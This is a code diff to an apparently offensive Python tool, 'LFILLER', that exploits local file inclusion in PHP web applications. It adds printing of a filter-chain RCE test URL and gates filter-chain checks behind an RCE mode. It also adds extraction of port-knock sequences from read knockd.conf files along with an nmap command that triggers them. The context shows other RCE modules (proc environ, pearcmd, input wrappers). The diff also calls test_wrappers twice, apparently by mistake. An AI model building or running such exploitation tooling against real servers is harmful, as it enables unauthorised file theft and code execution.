@@ -633,6 +633,8 @@ class LFILLER:
                 with self.lock:
                     self.results['filter_chain'] = True
                     print(f" {Colors.GREEN}[+]{Colors.END} PHP Filter Chain RCE likely possible!")
+                    print(f"     {Colors.YELLOW}Verify Manual:{Colors.END} {test_url}")
+                    print(f"     Response Length: {len(r.text)} bytes")
         except: pass
 
     def check_input_wrappers(self, param):
@@ -749,11 +751,12 @@ class LFILLER:
         for p in vulnerable_params[:1]: # Focus on the first working one for exploitation
             print(f"\n[*] Phase 2: Deep exploitation on {Colors.CYAN}{p}{Colors.END}")
             self.test_wrappers(p)
+            self.test_wrappers(p)
             self.enumerate_files(p)
-            self.check_filter_chain(p) # Filter chain writes to temp, gated by logic but fairly safe? usually considered RCE. Keep for now as "Advanced Read" unless specifically gated? Actually filter chain RCE is RCE.
             
-            # Gated RCE Modules (Poisoning, RFI, Wrappers)
+            # Gated RCE Modules (Poisoning, RFI, Wrappers, Filter Chain)
             if self.rce_mode:
+                self.check_filter_chain(p) # Moved inside RCE block as requested
                 self.check_input_wrappers(p)
                 self.check_proc_environ(p)
                 self.check_pearcmd(p)
@@ -916,6 +919,14 @@ class LFILLER:
                  # Show filename and truncated content snippet
                  snippet = content.replace('\n', ' ').strip()[:50]
                  print(f"  - {Colors.CYAN}{fpath}{Colors.END}: {snippet}...")
+                 
+                 # Helper: Extract Knock Sequence if found
+                 if 'knockd.conf' in fpath:
+                     import re
+                     seq = re.search(r'sequence\s*=\s*([0-9,]+)', content, re.IGNORECASE)
+                     if seq:
+                         print(f"    {Colors.YELLOW}[!] Port Knock Found:{Colors.END} {seq.group(1)}")
+                         print(f"    {Colors.YELLOW}[!] Nmap Trigger:{Colors.END} for x in {seq.group(1).replace(',', ' ')}; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x {urllib.parse.urlparse(self.url).netloc.split(':')[0]}; done")
 
         
         # New Advanced Results
